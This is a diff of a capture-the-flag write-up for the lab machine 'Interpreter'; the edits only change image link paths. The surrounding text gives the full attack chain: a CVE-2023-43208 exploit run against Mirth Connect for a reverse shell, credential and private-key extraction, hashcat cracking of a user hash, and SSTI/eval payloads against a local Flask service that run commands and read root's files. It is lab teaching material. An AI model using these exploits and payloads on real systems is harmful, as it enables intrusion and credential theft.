@@ -23,7 +23,7 @@ So we have two websites (or http and https versions) and ssh.
 ### Web Reconnaissance
 
 Visiting port 80 we see a website hosting NextGen Healthcare by Mirth Connect. There is some options to download a launcher and another to launch the launcher (perhaps?) On the right we see there is a login but this seemingly requires https.
-![[Pasted image 20260224140526.png]]
+![](Screenshots/Pasted%20image%2020260224140526.png)
 
 Visiting the https site we can attempt to login.
 
@@ -38,7 +38,7 @@ They all return 200, so we need to filter by length instead:
 ```bash
 ffuf -c -u http://10.129.6.65 -H "Host: FUZZ.interpreter.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fl 82
 ```
-![[Pasted image 20260224101843.png]]
+![](Screenshots/Pasted%20image%2020260224101843.png)
 
 Nothing found.
 
@@ -47,21 +47,21 @@ Directory fuzzing:
 ```bash
 feroxbuster -u http://interpreter.htb
 ```
-![[Pasted image 20260224101959.png]]
+![](Screenshots/Pasted%20image%2020260224101959.png)
 
 This finds an endpoint `/webadmin` and `/installers` which may be interesting.
 
 ```bash
 feroxbuster -u http://interpreter.htb
 ```
-![[Pasted image 20260224102501.png]]
+![](Screenshots/Pasted%20image%2020260224102501.png)
 
 Here we find `/api` but nothing else.
 
 ### Additional Enumeration
 
 Doing a quick google for Mirth Connect, it seems there has been several exploits in the past, with a notable one mentioned by NHS.
-![[Pasted image 20260224102140.png]]
+![](Screenshots/Pasted%20image%2020260224102140.png)
 
 I download the file using:
 
@@ -91,7 +91,7 @@ curl -k -H 'X-Requested-With: OpenAPI' https://interpreter.htb:443/api/server/ve
 ```
 
 This works and returns `4.4.0`.
-![[Pasted image 20260224103838.png]]
+![](Screenshots/Pasted%20image%2020260224103838.png)
 
 This verifies the version is affected and that the following PoC is applicable:
 
@@ -106,13 +106,13 @@ I spin up a listener using penelope (https://github.com/brightio/penelope) and t
 ```bash
 python3 CVE-2023-43208.py --url 'https://interpreter.htb:443/' --lhost 10.10.15.53 --lport 4444
 ```
-![[Pasted image 20260224104422.png]]
+![](Screenshots/Pasted%20image%2020260224104422.png)
 
 And we get a shell, and penelope auto upgrades it.
-![[Pasted image 20260224104448.png]]
+![](Screenshots/Pasted%20image%2020260224104448.png)
 
 We are running as user `mirth`. There is a user `sedric` in `/home` but we don't have permission to access it.
-![[Pasted image 20260224104530.png]]
+![](Screenshots/Pasted%20image%2020260224104530.png)
 
 ---
 
@@ -123,7 +123,7 @@ In `/usr/local/mirthconnect/conf/mirth.properties` we find a database URL:
 ```
 database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
 ```
-![[Pasted image 20260224104720.png]]
+![](Screenshots/Pasted%20image%2020260224104720.png)
 
 We find some keystore info (although this is doubtfully useful on its own):
 
@@ -148,7 +148,7 @@ We can connect using these:
 ```bash
 mysql -u mirthdb -p
 ```
-![[Pasted image 20260224104946.png]]
+![](Screenshots/Pasted%20image%2020260224104946.png)
 
 We use `mc_bdd_prod`:
 
@@ -161,10 +161,10 @@ Tables that exist:
 ```mysql
 SHOW TABLES;
 ```
-![[Pasted image 20260224105058.png]]
+![](Screenshots/Pasted%20image%2020260224105058.png)
 
 `PERSON_PASSWORD` seems interesting. We find a password hash and a `PERSON_ID` (2); cross-referencing this with the `PERSON` table this seems to belong to `sedric`.
-![[Pasted image 20260224105225.png]]
+![](Screenshots/Pasted%20image%2020260224105225.png)
 
 Password hash: `u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==`
 
@@ -177,7 +177,7 @@ This appears to be base64 encoded, and looking online it appears these passwords
 ```bash
 keytool -list -v -keystore keystore.jks
 ```
-![[Pasted image 20260224105938.png]]
+![](Screenshots/Pasted%20image%2020260224105938.png)
 
 I pull the file locally and start to extract the key:
 
@@ -190,7 +190,7 @@ keytool -importkeystore \
 ```
 
 I enter `5GbU5HGTOOgE` for the first 3 prompts and then the keypass `tAuJfQeXdnPw` for the 4th.
-![[Pasted image 20260224110432.png]]
+![](Screenshots/Pasted%20image%2020260224110432.png)
 
 Extract the private key (entering password `5GbU5HGTOOgE`):
 
@@ -198,7 +198,7 @@ Extract the private key (entering password `5GbU5HGTOOgE`):
 openssl pkcs12 -in keystore.p12 -nocerts -nodes -out private.key
 openssl pkcs12 -in keystore.p12 -nokeys -out cert.pem
 ```
-![[Pasted image 20260224110545.png]]
+![](Screenshots/Pasted%20image%2020260224110545.png)
 
 Now we have a private key. At this point Claude hallucinates a decryption script, which doesn't work — a dead end.
 
@@ -207,16 +207,16 @@ To progress, I dig into the Mirth Connect source code to see how encryption/hash
 The most relevant file: https://github.com/nextgenhealthcare/connect/blob/development/core-util/src/com/mirth/commons/encryption/Digester.java
 
 This code uses a salt size of 8 bytes, 600,000 iterations, and PBKDF2WithHmacSHA256.
-![[Pasted image 20260224114109.png]]
+![](Screenshots/Pasted%20image%2020260224114109.png)
 
 The operation starts here, where the digest is decoded from base64:
-![[Pasted image 20260224114624.png]]
+![](Screenshots/Pasted%20image%2020260224114624.png)
 
 The salt is then extracted by taking the first 8 bytes of the decoded digest:
-![[Pasted image 20260224114415.png]]
+![](Screenshots/Pasted%20image%2020260224114415.png)
 
 The remaining 32 bytes form the digest itself.
-![[Pasted image 20260224115941.png]]
+![](Screenshots/Pasted%20image%2020260224115941.png)
 
 So we can format this into a hashcat-crackable string using mode 10900, with the format `sha256:600000:<salt_b64>:<digest_b64>`.
 
@@ -242,7 +242,7 @@ hashcat -m 10900 -a 0 sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa
 ```
 
 And the password cracks eventually:
-![[Pasted image 20260224131408.png]]
+![](Screenshots/Pasted%20image%2020260224131408.png)
 
 **Cracked credential:** `snowflake1`
 
@@ -255,7 +255,7 @@ ssh sedric@interpreter.htb
 ```
 
 We can SSH in now and grab the user flag:
-![[Pasted image 20260224131514.png]]
+![](Screenshots/Pasted%20image%2020260224131514.png)
 
 ---
 
@@ -264,7 +264,7 @@ We can SSH in now and grab the user flag:
 ### Enumeration
 
 The `sudo` command seems to be missing:
-![[Pasted image 20260224131758.png]]
+![](Screenshots/Pasted%20image%2020260224131758.png)
 
 Let's run linpeas. It finds a few things, interestingly a service hosted at port `6661`. It also finds a shell script at `/usr/bin/gettext.sh`.
 
@@ -289,7 +289,7 @@ I manually search running processes to match up the service, and find the follow
 ```bash
 ps -aux
 ```
-![[Pasted image 20260224133844.png]]
+![](Screenshots/Pasted%20image%2020260224133844.png)
 
 Viewing this, it appears to be a Flask application running on port `54321`:
 
@@ -353,7 +353,7 @@ if __name__=="__main__":
 ```
 
 When I attempt to curl this service from my machine it doesn't work:
-![[Pasted image 20260224134117.png]]
+![](Screenshots/Pasted%20image%2020260224134117.png)
 
 Digging into the code, this check is what blocks it:
 
@@ -377,7 +377,7 @@ A valid baseline request looks like this:
 ```bash
 ./curl -s -X POST http://127.0.0.1:54321/addPatient -H "Content-Type: application/xml" -d '<?xml version="1.0"?><patient><firstname>John</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
 ```
-![[Pasted image 20260224135559.png]]
+![](Screenshots/Pasted%20image%2020260224135559.png)
 
 Due to the regex there are certain characters we aren't allowed, such as `:`.
 
@@ -386,7 +386,7 @@ Testing basic SSTI by injecting into `firstname`:
 ```bash
 ./curl -s -X POST http://127.0.0.1:54321/addPatient -H "Content-Type: application/xml" -d '<?xml version="1.0"?><patient><firstname>{__import__("os").popen("id").read()}</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
 ```
-![[Pasted image 20260224135643.png]]
+![](Screenshots/Pasted%20image%2020260224135643.png)
 
 This executes because the name is injected directly into the f-string and then `eval`'d:
 
@@ -401,7 +401,7 @@ Part of the challenge is that the regex bans spaces. This same technique can rea
 ```bash
 ./curl -s -X POST http://127.0.0.1:54321/addPatient -H "Content-Type: application/xml" -d '<?xml version="1.0"?><patient><firstname>{open("/root/root.txt").read()}</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
 ```
-![[Pasted image 20260224140346.png]]
+![](Screenshots/Pasted%20image%2020260224140346.png)
 
 ### Building the Final Exploit
 
@@ -423,14 +423,14 @@ And to execute it via the SSTI:
 ### Testing
 
 On the listener, we get a shell as root:
-![[Pasted image 20260224141940.png]]
+![](Screenshots/Pasted%20image%2020260224141940.png)
 
 **Note on an alternative path:** upon reflection, it is technically possible to achieve root before obtaining the user credential, since the low-privileged `mirth` foothold already has write access needed to stage the payload script and make the local curl request. The exact XML template expected by the service can be recovered from the database rather than reverse-engineering it, avoiding the need to crack the user hash at all:
 
 ```mysql
 SELECT * FROM CHANNEL;
 ```
-![[Pasted image 20260224143303.png]]
+![](Screenshots/Pasted%20image%2020260224143303.png)
 
 These decode as:
 
